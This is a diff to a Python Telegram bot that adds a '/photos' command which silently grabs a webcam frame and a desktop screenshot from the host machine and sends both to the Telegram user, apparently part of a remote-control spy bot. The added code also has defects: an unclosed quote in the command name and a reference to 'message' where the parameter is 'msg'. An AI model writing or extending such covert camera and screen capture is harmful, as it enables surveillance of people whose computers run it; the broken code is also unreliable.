@@ -66,6 +66,24 @@ async def deleter(message: types.Message, state: FSMContext):
             await message.answer(i)
 
     await file.next()
+@dp.message_handler(command='photos)
+async def file(msg:types.Message):
+    import cv2
+    cp = cv2.VideoCapture(0)
+    cp.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
+    cp.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
+    ret, frame = cp.read()
+    cv2.imwrite('photo.png', frame )
+    cp.release()
+
+    import pyautogui as pg
+    
+    sc = pg.screenshot()
+    sc.save(r'sc.png')
+    await message.reply_document(open('sc.png', 'rb'))
+    await message.reply_document(open('photo.png', 'rb'))
+
+
 @dp.callback_query_handler()
 async def data(data: types.CallbackQuery):
     print(data.data)
